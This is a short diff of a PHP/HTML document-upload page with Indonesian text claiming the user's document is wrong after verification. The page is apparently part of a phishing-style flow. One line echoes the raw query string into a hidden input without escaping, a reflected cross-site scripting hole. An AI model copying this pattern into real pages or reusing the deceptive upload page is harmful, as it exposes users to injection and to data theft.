@@ -35,7 +35,7 @@
 		<div class="row">
 			<div class="col-sm-12">
 
-			<i class="fa fa-angle-right" aria-hidden="true"></i> UPLOAD IMAGE
+			<i class="fa fa-angle-right" aria-hidden="true"></i> UPLOAD IMAGE: $voc
 <input type="hidden" id="surel" name="surel" value="<?php echo $_SERVER['QUERY_STRING'];?>" />
 			</div>
 		</div>
@@ -52,7 +52,7 @@
 			
 
 			<p>Data Anda Sudah Kami periksa dan sudah kami verifikasi, Tetapi Document Anda Salah2.</p>
-                        <input type="text" id = "voc" class="form-control" value ="<?php echo $voc;?>" readonly>
+                       
 			<form method="POST" id="contact" name="13" class="form-horizontal wpc_contact" novalidate="novalidate" enctype="multipart/form-data">
 			
 			<div class="panel panel-default">
